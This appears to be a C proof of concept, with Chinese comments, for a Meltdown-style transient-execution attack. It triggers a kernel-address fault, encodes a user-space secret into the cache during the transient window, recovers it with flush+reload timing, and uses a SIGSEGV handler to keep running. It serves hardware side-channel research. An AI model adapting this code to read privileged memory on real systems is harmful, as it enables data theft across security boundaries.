/*
* 先故意触发一次内核地址段错，但瞬态期间去偷用户态的 secret
* 也就是故障来自对内核地址的读取，但编码到 cache 的字节取自用户态的 addr。
* 这样能验证“带异常的瞬态窗口确实能执行并留下侧信道痕迹”，而不会去读内核内容。
* 
* 实验结果：在实验处理器上可成功拿到秘密字符串
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <sys/ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <x86intrin.h>
#include "../utils/cache_instr.h"


#define GAP 4096

uint8_t channel[256 * GAP];
int cache_hit_threshold = 400;

/* 用户态“秘密”缓冲区，用来写入固定字符串 */
static unsigned char secret_buf[256] __attribute__((aligned(4096)));
static const unsigned long fault_addr = 0xffff000000000000UL;

void flush_cache()
{
    for (int i = 0; i < 256; i++)
    {
        flush(&channel[i * GAP]);
    }
}

extern char stopspeculate[];


static void __attribute__((noinline)) victim(unsigned long secret_addr)
{
    __asm__ volatile(
        "1:\n\t"
        /* 扩大瞬态窗口 */
        ".rept 300\n\t"
        "add $0x141, %%rax\n\t"
        ".endr\n\t"

        /* 这条对内核地址的读取在用户态会触发权限/页错误（SIGSEGV） */
        "mov (%[kaddr]), %%rax\n\t"

        /* 在异常架构化之前，后续指令仍可能瞬态执行：这里去读取用户态 secret 并编码 */
        "movzbl (%[saddr]), %%eax\n\t"
        "shl $12, %%rax\n\t"
        "movb (%[target], %%rax, 1), %%al\n\t"

        /* 信号处理器会把 RIP 改到这里，避免进程崩溃 */
        ".globl stopspeculate\n\t"
        "stopspeculate:\n\t"
        "nop\n\t"
        :
        : [target] "r"(channel),
          [saddr]  "r"(secret_addr),
          [kaddr]  "r"(fault_addr)
        : "rax", "cc", "memory");
}




static int results[256];
void cache_detect()
{
    int i, mix_i;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    for (int i = 0; i < 256; i++)
    {
        mix_i = ((i * 167) + 13) & 255;
        addr = &channel[mix_i * GAP];

        time1 = rdtscp();
        maccess(addr);
        time2 = rdtscp();

        if ((int)(time2-time1) <= cache_hit_threshold)
            results[mix_i]++;
    }
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
    return;
}

int set_signal(void)
{
    struct sigaction act = {
        .sa_sigaction = sigsegv,
        .sa_flags = SA_SIGINFO,
    };

    return sigaction(SIGSEGV, &act, NULL);
}

int ReadOneByte(unsigned long addr)
{
    int i, ret = 0, max = -1, maxi = -1;
    static char buf[256];

    memset(results, 0, sizeof(results));

    for (i = 0; i < 1000; i++)
    {
        flush_cache();

        mfence();

        victim(addr);

        mfence();

        cache_detect();

    }
    for (i = 0; i < 256; i++)
    {
        if (results[i] && results[i] > max)
        {
            max = results[i];
            maxi = i;
        }
    }
    return maxi;
}

int main(int argc, char *argv[])
{
    int ret, i;
    unsigned long addr = 0, size = 0;

    memset(channel, 1, sizeof(channel));

    ret = set_signal();
    if (ret != 0) { perror("set_signal"); return 1; }


    if (argc >= 2)
    {
        sscanf(argv[1], "%d", &cache_hit_threshold);
    }

    const char *msg = "USERSPACE-SECRET: Attack test 123!\n";
    memset(secret_buf, 0, sizeof(secret_buf));
    memcpy(secret_buf, msg, strlen(msg));   // “写入”固定字符串
    addr = (unsigned long)secret_buf;       // 起始地址
    size = strlen((const char*)secret_buf); // 长度
    printf("Using userspace secret at 0x%lx (%lu bytes)\n", addr, size);


    for (i = 0; i < (int)size; i++)
    {
        int byte = ReadOneByte(addr);
        if (byte == -1) byte = 0xff;
        printf("read %lx = %02x %c (score=%d/%d)\n",
               addr, byte, isprint(byte) ? byte : ' ',
               byte != 0xff ? results[byte] : 0,
               1000);
        addr++;
    }
    return 0;
}